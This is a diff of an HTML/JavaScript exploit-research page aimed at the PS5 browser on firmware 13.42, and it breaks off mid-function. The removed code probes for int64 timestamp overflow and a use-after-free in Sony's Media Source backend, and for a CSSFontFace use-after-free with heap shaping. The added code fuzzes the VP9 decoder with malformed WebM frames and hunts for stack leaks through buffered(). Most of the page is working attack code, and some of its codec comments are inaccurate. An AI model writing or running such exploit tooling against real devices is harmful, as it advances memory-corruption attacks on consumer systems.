@@ -1,786 +1,573 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="utf-8">
-<title>PS5 FW 13.42 — Native Time Math + CSSFontFace Chain</title>
+<meta charset="UTF-8">
+<title>PS5 FW 13.42 — VP9 Fuzzer + buffered() Leak Hunter</title>
 <style>
-*{box-sizing:border-box;margin:0;padding:0}
-body{background:#0d1117;color:#c9d1d9;font-family:monospace;padding:20px;
-     max-width:960px;margin:0 auto}
-h1{color:#ff7b72;border-bottom:2px solid #ff7b72;padding-bottom:8px;
-   margin-bottom:14px;font-size:1rem}
-.info{background:#161b22;padding:10px 14px;border-radius:6px;margin-bottom:10px;
-      border:1px solid #30363d;font-size:.77rem;line-height:1.75}
-.row{display:flex;gap:5px;flex-wrap:wrap;margin-bottom:10px}
-button{background:#21262d;color:#c9d1d9;border:1px solid #30363d;
-       padding:8px 13px;font-size:11px;border-radius:5px;cursor:pointer;
-       font-family:monospace}
-button.g{background:#238636;border-color:#2ea043;color:#fff}
-button.r{background:#b62324;border-color:#da3633;color:#fff}
-button.y{background:#9e6a03;border-color:#bb8009;color:#fff}
-button.b{background:#1f4e8c;border-color:#388bfd;color:#fff}
-#out{background:#010409;padding:14px;border-radius:6px;border:1px solid #30363d;
-     min-height:420px;font-size:11.5px;line-height:1.65;overflow-y:auto;
-     max-height:72vh}
+body{font-family:monospace;background:#0a0a0a;color:#0f0;padding:12px;font-size:15px}
+button{background:#1a1a1a;color:#0f0;border:1px solid #0f0;padding:10px 16px;margin:5px;cursor:pointer;font-family:monospace;font-size:14px}
+button:hover{background:#0f0;color:#000}
+button.danger{background:#1a0000;color:#f44;border:1px solid #f44}
+button.danger:hover{background:#f44;color:#000}
+button.gold{background:#1a1500;color:#fa0;border:1px solid #fa0}
+button.gold:hover{background:#fa0;color:#000}
+button.blue{background:#001a1a;color:#0cf;border:1px solid #0cf}
+button.blue:hover{background:#0cf;color:#000}
+.panel{border:1px solid #444;padding:12px;margin:10px 0;background:#111;border-radius:8px}
+.log{background:#000;border:2px solid #333;padding:10px;height:400px;overflow-y:auto;white-space:pre-wrap;font-size:15px;line-height:1.8}
+.ok{color:#0f0}.err{color:#f44}.warn{color:#fa0}.info{color:#0cf}
+h2{color:#ff0055;margin:5px 0;font-size:17px}
+.stats{background:#0a0a0a;border:1px solid #333;padding:8px;margin:5px 0;font-size:13px}
 </style>
 </head>
 <body>
-<h1>PS5 FW 13.42 — Time Math Overflow + appendWindow + CSSFontFace UAF</h1>
 
-<div class="info">
-<b style="color:#ff7b72">WHY VP9 FUZZING FAILED:</b>
-PSSourceBufferBackend validates EBML/VP9 structure before native parse.
-Malformed containers are rejected at the IPC/validation boundary.<br><br>
-<b style="color:#ff7b72">NEW VECTORS:</b><br>
-<b>A</b> — timestampOffset=1e+308 → int64 overflow in native time map → UAF on wrong segment<br>
-<b>B</b> — appendWindowStart/End extreme values → native window clamp math overflow<br>
-<b>C</b> — Multi-SourceBuffer race on corrupted time map → concurrent UAF<br>
-<b>D</b> — CSSFontFace UAF → 17 R/W channels → heap shape + partial leak<br>
-<b>E</b> — Canvas handle probe → updateCanvasHandle() integer handle attack
+<h2>🎯 PS5 FW 13.42 — VP9 Fuzzer + buffered() Leak Hunter</h2>
+<p style="color:#888;font-size:12px">Targets: PSMediaPlayerBackend::append() + buffered() Stack UAR | Stores results in localStorage</p>
+
+<div class="panel">
+<h2>📦 Status</h2>
+<div id="status" class="stats">Ready</div>
+<button onclick="clearAllStorage()">🗑 Clear All Storage</button>
+<button onclick="showStorage()">📂 Show Stored Results</button>
 </div>
 
-<div class="row">
-  <button class="g" onclick="r0()">0. Setup + Codec Check</button>
-  <button class="y" onclick="r1()">1. timestampOffset INT64 Overflow</button>
-  <button class="y" onclick="r2()">2. appendWindow Extreme Values</button>
-  <button class="y" onclick="r3()">3. Remove() UAF via Overflowed Time</button>
-  <button class="y" onclick="r4()">4. Multi-SB Race + Overflow</button>
-  <button class="b" onclick="r5()">5. CSSFontFace UAF — 17 Channels</button>
-  <button class="b" onclick="r6()">6. CSSFontFace Heap Shape</button>
-  <button class="b" onclick="r7()">7. Canvas Handle Probe</button>
-  <button class="r" onclick="rAll()">⚡ Full Chain</button>
+<div class="panel">
+<h2>🔴 A. VP9 Native Decoder Fuzzer</h2>
+<p style="color:#888;font-size:11px">Sends malformed VP9 frames directly to Sony native decoder via MSE</p>
+<button class="danger" onclick="runVP9Fuzzer()">🔥 RUN VP9 FUZZER (All Vectors)</button>
+<button class="gold" onclick="vp9SuperframeOverflow()">1. Superframe Index Overflow</button>
+<button class="gold" onclick="vp9TileOverflow()">2. Tile Column/Row Overflow</button>
+<button class="gold" onclick="vp9RefFrameOOB()">3. Reference Frame OOB</button>
+<button class="gold" onclick="vp9HeaderSizeOverflow()">4. Compressed Header Size Overflow</button>
+<button class="gold" onclick="vp9SegmentationOOB()">5. Segmentation Map OOB</button>
+<button class="gold" onclick="vp9FrameSizeOverflow()">6. Frame Size Overflow</button>
+<button class="gold" onclick="vp9ProfileMismatch()">7. Profile/Level Mismatch</button>
+<button class="gold" onclick="vp9RandomCorrupt()">8. Random Corruption</button>
 </div>
 
-<div id="out">Ready.</div>
+<div class="panel">
+<h2>🟡 B. buffered() UAR Leak Hunter</h2>
+<p style="color:#888;font-size:11px">Calls buffered() repeatedly to catch stale stack bytes</p>
+<button class="blue" onclick="runBufferedHunter()">🔍 RUN buffered() LEAK HUNTER</button>
+<button class="blue" onclick="bufferedSingleTest()">Single buffered() Test</button>
+<button class="blue" onclick="bufferedRapidTest()">Rapid buffered() (100x)</button>
+<button class="blue" onclick="bufferedWithPressure()">buffered() + Canvas Pressure</button>
+</div>
+
+<div class="panel">
+<h2>🟢 C. Combined Attack</h2>
+<button class="danger" onclick="combinedVP9Buffered()">🔥 VP9 + buffered() Combined</button>
+</div>
+
+<div class="panel">
+<h2>📝 Log</h2>
+<div class="log" id="log"></div>
+<button onclick="document.getElementById('log').innerHTML=''">Clear</button>
+</div>
 
 <script>
-var O = document.getElementById('out');
-function clr(t){O.innerHTML='';pr(t,'#58a6ff');pr('','');}
-function pr(m,c){var s=document.createElement('span');s.style.color=c||'#c9d1d9';
-  s.textContent=m+'\n';O.appendChild(s);O.scrollTop=O.scrollHeight;}
-function hit(m){pr(m,'#ff7b72');}
-function ok(m) {pr(m,'#3ddc84');}
-function inf(m){pr(m,'#58a6ff');}
-function wrn(m){pr(m,'#ffcc44');}
-function sep() {pr('─'.repeat(58),'#1e2530');}
+const L = document.getElementById('log');
+const STORE_KEY = 'PS5_VP9_FUZZ_v9';
+let fuzzResults = [];
 
-// ── Minimal valid WebM/VP9 for MSE operations ─────────────────────────────────
-function makeValidWebM(durationSec, timecodeMs) {
-  durationSec  = durationSec  || 1;
-  timecodeMs   = timecodeMs   || 0;
+function log(msg, cls='info') {
+  const d = new Date().toLocaleTimeString('en-GB');
+  const line = '['+d+'] '+msg;
+  L.innerHTML += '<div class="'+cls+'">'+line+'</div>';
+  L.scrollTop = L.scrollHeight;
+  console.log('['+cls+'] '+msg);
+}
 
-  function vi(id){
-    return id<=0xFF?[id]:[(id>>8)&0xFF,id&0xFF];
+function storeResult(test, result, data) {
+  try {
+    const entry = {time: Date.now(), test, result, data, ua: navigator.userAgent};
+    fuzzResults.push(entry);
+    localStorage.setItem(STORE_KEY, JSON.stringify(fuzzResults));
+  } catch(e) {}
+}
+
+function clearAllStorage() {
+  localStorage.removeItem(STORE_KEY);
+  fuzzResults = [];
+  log('Storage cleared', 'ok');
+}
+
+function showStorage() {
+  try {
+    const data = JSON.parse(localStorage.getItem(STORE_KEY) || '[]');
+    log('=== Stored Results ('+data.length+' entries) ===', 'ok');
+    for (const e of data.slice(-20)) {
+      log(e.test+': '+e.result, 'info');
+    }
+  } catch(e) { log('Storage error', 'err'); }
+}
+
+// ============================================================
+// WebM/VP9 Builder Helpers
+// ============================================================
+function buildEBML(id, data) {
+  const idBytes = new Uint8Array(id);
+  let size = data.length;
+  let sizeBytes = [];
+  if (size < 0x7F) {
+    sizeBytes = [0x80 | size];
+  } else if (size < 0x3FFF) {
+    sizeBytes = [0x40 | (size >> 8), size & 0xFF];
+  } else if (size < 0x1FFFFF) {
+    sizeBytes = [0x20 | (size >> 16), (size >> 8) & 0xFF, size & 0xFF];
+  } else {
+    sizeBytes = [0x10 | (size >> 24), (size >> 16) & 0xFF, (size >> 8) & 0xFF, size & 0xFF];
   }
-  function vs(sz){
-    if(sz<0)return[0xFF];
-    if(sz<0x7E)return[sz|0x80];
-    if(sz<0x3FFE)return[(sz>>8)|0x40,sz&0xFF];
-    return[(sz>>16)|0x20,(sz>>8)&0xFF,sz&0xFF];
-  }
-  function vu(v,b){var r=[];for(var i=b-1;i>=0;i--)r.push((v>>(i*8))&0xFF);return r;}
-  function el(id,data){return vi(id).concat(vs(data.length)).concat(Array.from(data));}
+  const result = new Uint8Array(idBytes.length + sizeBytes.length + data.length);
+  result.set(idBytes, 0);
+  result.set(new Uint8Array(sizeBytes), idBytes.length);
+  result.set(data, idBytes.length + sizeBytes.length);
+  return result;
+}
 
-  // Minimal VP9 key frame bytes (profile 0, 320x240, no tiles, q=40)
-  var vp9 = new Uint8Array([
-    0x49,0x83,0x42, // frame sync code
-    0x00,           // frame_marker=2<<6|profile=0 packed
-    0x00,           // color_config + show_frame flags
-    0xA0,0x00,      // frame width-1 = 319 (16-bit)
-    0xEF,0x00,      // frame height-1 = 239
-    0x00,           // render_and_frame_size_different=0
-    0x00,           // loop_filter_level=0 (6 bits) + sharpness=0 (3 bits, partial)
-    0x00,           // base_q_idx=0 (8 bits, partial)
-    0x00,           // segmentation=0, tile_cols=0, tile_rows=0
-    0x00,0x01,      // compressed_header_size = 1
-    0x00            // compressed header payload
+function buildWebMContainer(vp9Frame) {
+  // EBML header
+  const doctype = buildEBML([0x42,0x82], new Uint8Array([0x77,0x65,0x62,0x6D]));
+  const readver = buildEBML([0x42,0x85], new Uint8Array([0x02]));
+  const version = buildEBML([0x42,0x87], new Uint8Array([0x02]));
+  const maxid = buildEBML([0x42,0xF2], new Uint8Array([0x04]));
+  const maxsize = buildEBML([0x42,0xF3], new Uint8Array([0x08]));
+  
+  const ebmlContent = new Uint8Array(doctype.length + readver.length + version.length + maxid.length + maxsize.length);
+  let off = 0;
+  [doctype, readver, version, maxid, maxsize].forEach(a => { ebmlContent.set(a, off); off += a.length; });
+  const ebml = buildEBML([0x1A,0x45,0xDF,0xA3], ebmlContent);
+  
+  // Segment with cluster containing VP9 frame
+  const timecode = new Uint8Array([0xE7, 0x81, 0x00]); // Timecode = 0
+  const block = buildEBML([0xA3], vp9Frame);
+  const clusterContent = new Uint8Array(timecode.length + block.length);
+  clusterContent.set(timecode, 0);
+  clusterContent.set(block, timecode.length);
+  const cluster = buildEBML([0x1F,0x43,0xB6,0x75], clusterContent);
+  
+  const segment = buildEBML([0x18,0x53,0x80,0x67], cluster);
+  
+  const result = new Uint8Array(ebml.length + segment.length);
+  result.set(ebml, 0);
+  result.set(segment, ebml.length);
+  return result;
+}
+
+// ============================================================
+// VP9 Frame Builders (Malformed)
+// ============================================================
+
+// 1. Superframe Index Overflow
+function makeSuperframeOverflow() {
+  // VP9 frame + superframe index with 255 frames
+  const frame = new Uint8Array(0x100);
+  frame[0] = 0x82; // VP9 OBU header: profile 0, keyframe
+  frame[1] = 0x49; // sync code
+  frame[2] = 0x83; // show_existing_frame = 0
+  
+  // Superframe index at end
+  const idxPos = frame.length - 5;
+  frame[idxPos] = 0xC0 | 254; // superframe marker + 255 frames (254 = frames-1)
+  frame[idxPos+1] = 0xFF; // frame size byte 1
+  frame[idxPos+2] = 0xFF; // frame size byte 2
+  frame[idxPos+3] = 0xFF; // frame size byte 3
+  frame[idxPos+4] = 0x0F; // frame size byte 4 + marker
+  
+  return buildWebMContainer(frame);
+}
+
+// 2. Tile Column/Row Overflow
+function makeTileOverflow() {
+  const frame = new Uint8Array(0x200);
+  frame[0] = 0x82; // VP9 OBU header
+  frame[1] = 0x49; // sync code
+  frame[2] = 0x83; // show_existing_frame = 0
+  
+  // Corrupt compressed header: tile_cols_log2 = 7, tile_rows_log2 = 6
+  // This would claim 128 columns × 64 rows = 8192 tiles
+  for (let i = 3; i < 0x50; i++) {
+    frame[i] = 0xFF; // Fill header area with 0xFF to corrupt tile info
+  }
+  
+  return buildWebMContainer(frame);
+}
+
+// 3. Reference Frame OOB
+function makeRefFrameOOB() {
+  const frame = new Uint8Array(0x100);
+  frame[0] = 0x82; // VP9 OBU header
+  frame[1] = 0x49; // sync code
+  frame[2] = 0x83; // show_existing_frame = 0
+  
+  // Inter-frame with invalid ref_frame_idx
+  frame[3] = 0x00; // frame_type = 1 (inter)
+  frame[4] = 0xFF; // ref_frame_idx[0] = 255
+  frame[5] = 0xFF; // ref_frame_idx[1] = 255
+  frame[6] = 0xFF; // ref_frame_idx[2] = 255
+  
+  return buildWebMContainer(frame);
+}
+
+// 4. Compressed Header Size Overflow
+function makeHeaderSizeOverflow() {
+  const frame = new Uint8Array(0x100);
+  frame[0] = 0x82; // VP9 OBU header
+  frame[1] = 0x49; // sync code
+  frame[2] = 0x83; // show_existing_frame = 0
+  
+  // Claim huge compressed header size
+  frame[3] = 0xFF;
+  frame[4] = 0xFF;
+  frame[5] = 0xFF;
+  
+  return buildWebMContainer(frame);
+}
+
+// 5. Segmentation Map OOB
+function makeSegmentationOOB() {
+  const frame = new Uint8Array(0x100);
+  frame[0] = 0x82; // VP9 OBU header
+  frame[1] = 0x49; // sync code
+  frame[2] = 0x83; // show_existing_frame = 0
+  
+  // Enable segmentation with 256 segments
+  frame[3] = 0x10; // segmentation_enabled = 1
+  frame[4] = 0xFF; // segment_id_bits = 8 (256 segments)
+  
+  return buildWebMContainer(frame);
+}
+
+// 6. Frame Size Overflow
+function makeFrameSizeOverflow() {
+  const frame = new Uint8Array(0x100);
+  frame[0] = 0x82; // VP9 OBU header
+  frame[1] = 0x49; // sync code
+  frame[2] = 0x83; // show_existing_frame = 0
+  
+  // Width = 0xFFFF, Height = 0xFFFF
+  frame[3] = 0xFF; // render_size_present = 1
+  frame[4] = 0xFF; // render_width high
+  frame[5] = 0xFF; // render_width low
+  frame[6] = 0xFF; // render_height high
+  frame[7] = 0xFF; // render_height low
+  
+  return buildWebMContainer(frame);
+}
+
+// 7. Profile/Level Mismatch
+function makeProfileMismatch() {
+  const frame = new Uint8Array(0x100);
+  frame[0] = 0x8E; // VP9 OBU header: profile 3 (12-bit), keyframe
+  frame[1] = 0x49; // sync code
+  frame[2] = 0x83; // show_existing_frame = 0
+  
+  // Profile 3 with level = 255 (invalid)
+  frame[3] = 0xFF; // level = 255
+  
+  return buildWebMContainer(frame);
+}
+
+// 8. Random Corruption
+function makeRandomCorrupt() {
+  const frame = new Uint8Array(0x1000);
+  for (let i = 0; i < frame.length; i++) {
+    frame[i] = Math.floor(Math.random() * 256);
+  }
+  frame[0] = 0x82; // Keep VP9 marker
+  return buildWebMContainer(frame);
+}
+
+// ============================================================
+// VP9 Fuzzer Runner
+// ============================================================
+async function testVP9Vector(name, data) {
+  log('Testing: '+name+' ('+data.length+' bytes)...', 'info');
+  
+  try {
+    const ms = new MediaSource();
+    const url = URL.createObjectURL(ms);
+    const v = document.createElement('video');
+    v.src = url; v.muted = true;
+    
+    await new Promise(r => ms.addEventListener('sourceopen', r, {once:true}));
+    
+    if (!MediaSource.isTypeSupported('video/webm; codecs="vp9"')) {
+      log('VP9 not supported!', 'err');
+      URL.revokeObjectURL(url);
+      return {name, result: 'NOT_SUPPORTED'};
+    }
+    
+    const sb = ms.addSourceBuffer('video/webm; codecs="vp9"');
+    
+    const t0 = performance.now();
+    sb.appendBuffer(data);
+    
+    const result = await new Promise((resolve) => {
+      const t = setTimeout(() => resolve('TIMEOUT'), 5000);
+      sb.addEventListener('updateend', () => { clearTimeout(t); resolve('OK'); }, {once:true});
+      sb.addEventListener('error', (e) => { clearTimeout(t); resolve('ERROR'); }, {once:true});
+    });
+    
+    const elapsed = performance.now() - t0;
+    log(name+': '+result+' ('+elapsed.toFixed(0)+'ms)', result==='OK'?'ok':'warn');
+    
+    storeResult(name, result, {size: data.length, time: elapsed});
+    URL.revokeObjectURL(url);
+    return {name, result, elapsed};
+    
+  } catch(e) {
+    log(name+': EXCEPTION — '+e.name+': '+e.message, 'err');
+    storeResult(name, 'EXCEPTION', {error: e.name, msg: e.message});
+    return {name, result: 'EXCEPTION', error: e.message};
+  }
+}
+
+async function runVP9Fuzzer() {
+  log('=== 🔥 RUNNING VP9 FUZZER ===', 'err');
+  document.getElementById('status').textContent = 'VP9 Fuzzing...';
+  
+  const vectors = [
+    {name: 'Superframe Overflow', fn: makeSuperframeOverflow},
+    {name: 'Tile Overflow', fn: makeTileOverflow},
+    {name: 'Ref Frame OOB', fn: makeRefFrameOOB},
+    {name: 'Header Size Overflow', fn: makeHeaderSizeOverflow},
+    {name: 'Segmentation OOB', fn: makeSegmentationOOB},
+    {name: 'Frame Size Overflow', fn: makeFrameSizeOverflow},
+    {name: 'Profile Mismatch', fn: makeProfileMismatch},
+    {name: 'Random Corrupt', fn: makeRandomCorrupt},
+  ];
+  
+  for (const v of vectors) {
+    const data = v.fn();
+    await testVP9Vector(v.name, data);
+    await new Promise(r => setTimeout(r, 500));
+  }
+  
+  log('=== VP9 FUZZER COMPLETE ===', 'ok');
+  document.getElementById('status').textContent = 'VP9 Fuzzing Complete';
+}
+
+// Individual buttons
+async function vp9SuperframeOverflow() { await testVP9Vector('Superframe Overflow', makeSuperframeOverflow()); }
+async function vp9TileOverflow() { await testVP9Vector('Tile Overflow', makeTileOverflow()); }
+async function vp9RefFrameOOB() { await testVP9Vector('Ref Frame OOB', makeRefFrameOOB()); }
+async function vp9HeaderSizeOverflow() { await testVP9Vector('Header Size Overflow', makeHeaderSizeOverflow()); }
+async function vp9SegmentationOOB() { await testVP9Vector('Segmentation OOB', makeSegmentationOOB()); }
+async function vp9FrameSizeOverflow() { await testVP9Vector('Frame Size Overflow', makeFrameSizeOverflow()); }
+async function vp9ProfileMismatch() { await testVP9Vector('Profile Mismatch', makeProfileMismatch()); }
+async function vp9RandomCorrupt() { await testVP9Vector('Random Corrupt', makeRandomCorrupt()); }
+
+// ============================================================
+// buffered() UAR Leak Hunter
+// ============================================================
+function buildMinimalMP4() {
+  const ftyp = new Uint8Array([
+    0x00,0x00,0x00,0x20, 0x66,0x74,0x79,0x70,
+    0x69,0x73,0x6f,0x6d, 0x00,0x00,0x02,0x00,
+    0x69,0x73,0x6f,0x6d, 0x6d,0x70,0x34,0x31,
+    0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00
   ]);
-
-  // SimpleBlock: track=1, timecode=timecodeMs (clamped to 16-bit), keyframe
-  var tc = timecodeMs & 0xFFFF;
-  var sbData = [0x81, (tc>>8)&0xFF, tc&0xFF, 0x80].concat(Array.from(vp9));
-  var simpleBlock  = el(0xA3, sbData);
-  var clusterTC    = el(0xE7, vu(timecodeMs & 0x7FFFFFFF, 8));
-  var cluster      = el(0x1F43B675, [].concat(clusterTC, simpleBlock));
-
-  var trackEntry = el(0xAE,[].concat(
-    el(0xD7,vu(1,1)),
-    el(0x73C5,vu(1,8)),
-    el(0x83,vu(1,1)),
-    el(0x86,Array.from(new TextEncoder().encode('V_VP9'))),
-    el(0xE0,[].concat(el(0xB0,vu(320,4)),el(0xBA,vu(240,4))))
-  ));
-  var tracks  = el(0x1654AE6B,trackEntry);
-  var durBuf  = new ArrayBuffer(8);
-  new DataView(durBuf).setFloat64(0,durationSec*1000,false);
-  var segInfo = el(0x1549A966,[].concat(
-    el(0x2AD7B1,vu(1000000,8)),
-    el(0x4489,Array.from(new Uint8Array(durBuf)))
-  ));
-  var seg     = el(0x18538067,[].concat(segInfo,tracks,cluster));
-  var hdr     = el(0x1A45DFA3,[].concat(
-    el(0x4286,vu(1,1)),el(0x42F7,vu(1,1)),
-    el(0x4282,Array.from(new TextEncoder().encode('webm'))),
-    el(0x4287,vu(4,1)),el(0x4285,vu(2,1))
-  ));
-  return new Uint8Array(hdr.concat(seg));
+  const moov = new Uint8Array([
+    0x00,0x00,0x00,0x6c, 0x6d,0x6f,0x6f,0x76,
+    0x00,0x00,0x00,0x5c, 0x6d,0x76,0x68,0x64,
+    0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
+    0x00,0x00,0x00,0x00, 0x00,0x00,0x03,0xe8,
+    0x00,0x00,0x00,0x00, 0x00,0x01,0x00,0x00,
+    0x01,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
+    0x00,0x00,0x00,0x00, 0x00,0x01,0x00,0x00,
+    0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
+    0x00,0x00,0x00,0x00, 0x00,0x01,0x00,0x00,
+    0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
+    0x00,0x00,0x00,0x00, 0x40,0x00,0x00,0x00,
+    0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
+    0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
+    0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
+    0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00
+  ]);
+  const mdat = new Uint8Array([0x00,0x00,0x00,0x08, 0x6d,0x64,0x61,0x74]);
+  const mp4 = new Uint8Array(ftyp.length + moov.length + mdat.length);
+  mp4.set(ftyp, 0); mp4.set(moov, ftyp.length); mp4.set(mdat, ftyp.length + moov.length);
+  return mp4;
 }
 
-function setupMSE(cb){
-  var v  = document.createElement('video');
-  document.body.appendChild(v);
-  var ms = new MediaSource();
-  v.src  = URL.createObjectURL(ms);
-  ms.addEventListener('sourceopen',function(){
-    try {
-      var sb = ms.addSourceBuffer('video/webm; codecs="vp9"');
-      cb(sb, ms, v);
-    } catch(e){ hit('[MSE] addSourceBuffer: '+e.message); }
-  });
-  return {video:v, ms:ms};
-}
-
-function appendAndWait(sb, data, cb) {
-  function onEnd(){ sb.removeEventListener('updateend',onEnd);
-                    sb.removeEventListener('error',onErr); cb(null); }
-  function onErr(e){ sb.removeEventListener('updateend',onEnd);
-                     sb.removeEventListener('error',onErr); cb(e); }
-  sb.addEventListener('updateend',onEnd);
-  sb.addEventListener('error',onErr);
-  try { sb.appendBuffer(data); }
-  catch(e){ cb(e); }
-}
-
-// ── 0. Setup ──────────────────────────────────────────────────────────────────
-function r0(){
-  clr('[0] Environment + Codec Check');
-  var codecs=['video/webm; codecs="vp9"','video/mp4; codecs="avc1.42E01E"',
-              'audio/mp4; codecs="mp4a.40.2"'];
-  codecs.forEach(function(t){
-    var s=MediaSource.isTypeSupported(t);
-    pr((s?'[✓] ':'[✗] ')+t,s?'#3ddc84':'#555');
-  });
-  sep();
-  inf('[*] Target: native time math in PSSourceBufferBackend / PSMediaPlayerBackend');
-  inf('[*] int64 nanoseconds: max = 9223372036854775807 (~9.2×10¹⁸)');
-  inf('[*] 1e+308 seconds × 1e9 ns/s = 1e+317 → int64 OVERFLOW');
-  inf('[*] appendWindowStart/End → clamp in native time map → wrong range');
-  inf('[*] timestampOffset   → added to every cluster timecode → wrong key in time map');
-  sep();
-  ok('[*] VP9 validator confirmed: malformed VP9 REJECTED before native parse');
-  ok('[*] Approach: valid VP9 frames + extreme timing metadata → native time math overflow');
-}
-
-// ── 1. timestampOffset INT64 Overflow ─────────────────────────────────────────
-function r1(){
-  clr('[1] timestampOffset INT64 Overflow');
-  inf('[*] timestampOffset shifts every cluster timecode before insertion into time map');
-  inf('[*] Native math: int64 effectiveTime = (clusterTC_ns + offset_ns)');
-  inf('[*] offset_ns = 1e+308 * 1e9 → undefined behavior on int64 overflow');
-  sep();
-
-  var OVERFLOW_VALS = [
-    { v: 1e+308,        label: '1e+308 (MAX_DOUBLE-ish)' },
-    { v: Number.MAX_VALUE, label: 'Number.MAX_VALUE' },
-    { v: 9007199254.0,  label: '~2^53 seconds (int64 boundary)' },
-    { v: 9223372.036,   label: '~int64_max / 1e9 (exact ns overflow)' },
-    { v: -1,            label: '-1 (negative offset)' },
-    { v: -1e+308,       label: '-1e+308 (max negative)' },
-  ];
-
-  var webm = makeValidWebM(1, 0);
-  var results = [];
-
-  function runNext(idx) {
-    if (idx >= OVERFLOW_VALS.length) {
-      sep();
-      inf('[RESULT SUMMARY]');
-      results.forEach(function(r){
-        pr('  offset='+r.label+' → '+r.result,
-           r.result.includes('ERROR')||r.result.includes('crash') ?
-           '#ff7b72' : '#3ddc84');
-      });
-      sep();
-      hit('[*] Any ERROR or unexpected behavior indicates native time math fault');
-      hit('[*] Silent acceptance of 1e+308 = int64 overflow in native backend');
-      hit('[*] Combined with remove(): UAF on wrong segment pointer');
-      return;
-    }
-
-    var entry = OVERFLOW_VALS[idx];
-    setupMSE(function(sb, ms) {
-      // Set the overflow offset BEFORE appending
-      try {
-        sb.timestampOffset = entry.v;
-        inf('['+idx+'] Set timestampOffset = '+entry.label);
-        inf('['+idx+'] Actual value: '+sb.timestampOffset);
-      } catch(e) {
-        results.push({label:entry.label, result:'SET_THREW: '+e.name});
-        pr('['+idx+'] Set threw: '+e.name, '#ffcc44');
-        setTimeout(function(){runNext(idx+1);},200);
-        return;
-      }
-
-      appendAndWait(sb, webm, function(err) {
-        if (err) {
-          results.push({label:entry.label,
-            result:'APPEND_ERROR: '+err.type+'|'+err.target?.error?.message});
-          hit('['+idx+'] APPEND ERROR: possible native time math rejection');
-        } else {
-          // Read back the actual buffered range
-          var len = sb.buffered.length;
-          var rangeInfo = len > 0
-            ? ('start='+sb.buffered.start(0).toFixed(6)+
-               ' end='+sb.buffered.end(0).toFixed(6))
-            : 'buffered.length=0';
-          results.push({label:entry.label, result:'OK | buffered: '+rangeInfo});
-          ok('['+idx+'] appendBuffer OK | '+rangeInfo);
-
-          // Check if the buffered range reflects the overflowed time
-          if (len > 0) {
-            var start = sb.buffered.start(0);
-            // If timestampOffset was huge but buffered shows 0-1s:
-            // backend clamped or wrapped the time
-            if (Math.abs(start) < 1e10 && Math.abs(entry.v) > 1e10) {
-              hit('['+idx+'] TIME MISMATCH: offset='+entry.v+
-                  ' but buffered.start='+start);
-              hit('['+idx+'] Native backend WRAPPED or CLAMPED int64 overflow');
-              hit('['+idx+'] The segment is in the time map at the WRONG position');
-            }
-          }
-        }
-
-        // Now try to remove — UAF trigger if time map is corrupted
-        try {
-          sb.addEventListener('updateend', function onRM(){
-            sb.removeEventListener('updateend', onRM);
-            ok('['+idx+'] remove() completed');
-            setTimeout(function(){runNext(idx+1);},300);
-          });
-          sb.remove(0, Infinity);
-          inf('['+idx+'] remove(0, Infinity) called on possibly-corrupted time map');
-        } catch(e) {
-          hit('['+idx+'] remove() threw: '+e.name+': '+e.message);
-          setTimeout(function(){runNext(idx+1);},300);
-        }
-      });
-    });
-  }
-  runNext(0);
-}
-
-// ── 2. appendWindow Extreme Values ────────────────────────────────────────────
-function r2(){
-  clr('[2] appendWindowStart / appendWindowEnd Extreme Values');
-  inf('[*] appendWindow defines the accepted timestamp range for incoming data');
-  inf('[*] Native backend: samples outside window are DROPPED before insertion');
-  inf('[*] int64 overflow in window boundary check: wrong segments kept/dropped');
-  sep();
-
-  var WINDOW_CASES = [
-    {start:0,             end:Infinity,      label:'normal (0, Infinity)'},
-    {start:0,             end:1e+308,        label:'end=1e+308'},
-    {start:1e+308,        end:Infinity,      label:'start=1e+308'},
-    {start:-1,            end:1,             label:'start=-1 (negative)'},
-    {start:9223372.036,   end:9223372.037,   label:'start≈int64_max/ns boundary'},
-    {start:0,             end:Number.MIN_VALUE, label:'end=MIN_VALUE (near zero)'},
-    {start:Number.MAX_VALUE, end:Infinity,   label:'start=MAX_VALUE'},
-  ];
-
-  var webm = makeValidWebM(1, 0);
-
-  function runNext(idx){
-    if(idx>=WINDOW_CASES.length){ok('[*] appendWindow vectors done');return;}
-    var c = WINDOW_CASES[idx];
-    setupMSE(function(sb){
-      try {
-        if(isFinite(c.start)) sb.appendWindowStart = c.start;
-        if(isFinite(c.end))   sb.appendWindowEnd   = c.end;
-        else                  sb.appendWindowEnd    = Infinity;
-        inf('['+idx+'] window=['+c.start+', '+c.end+'] — '+c.label);
-        pr('['+idx+'] actual: ['+sb.appendWindowStart+', '+sb.appendWindowEnd+']','#c9d1d9');
-      } catch(e){
-        hit('['+idx+'] window SET threw: '+e.name+': '+e.message);
-        setTimeout(function(){runNext(idx+1);},200); return;
-      }
-
-      appendAndWait(sb, webm, function(err){
-        if(err){
-          hit('['+idx+'] APPEND ERROR — '+c.label+': '+err.type);
-        } else {
-          var bLen = sb.buffered.length;
-          pr('['+idx+'] OK — buffered.length='+bLen,bLen===0?'#ffcc44':'#3ddc84');
-          if(bLen===0){
-            hit('['+idx+'] ALL SAMPLES DROPPED — window clamp discarded entire frame');
-            hit('['+idx+'] Extreme window value caused native drop-all behavior');
-          }
-        }
-        setTimeout(function(){runNext(idx+1);},300);
-      });
-    });
-  }
-  runNext(0);
-}
-
-// ── 3. Remove() UAF via Overflowed Time Map ───────────────────────────────────
-function r3(){
-  clr('[3] remove() UAF — Overflowed Time Map Entry');
-  inf('[*] Step 1: append valid frame with timestampOffset=9223372.036 (≈int64 ns overflow)');
-  inf('[*] Step 2: frame lands in time map at WRONG position (overflowed key)');
-  inf('[*] Step 3: remove(0, 1) removes a DIFFERENT segment than intended');
-  inf('[*] Step 4: The wrong segment memory is freed while still referenced');
-  sep();
-
-  var webm = makeValidWebM(1, 0);
-
-  setupMSE(function(sb, ms){
-    // Step 1: normal append first
-    inf('[*] Step 1: Normal append (build time map entry at t=0)');
-    appendAndWait(sb, webm, function(err){
-      if(err){hit('[*] Step 1 error: '+err.type);return;}
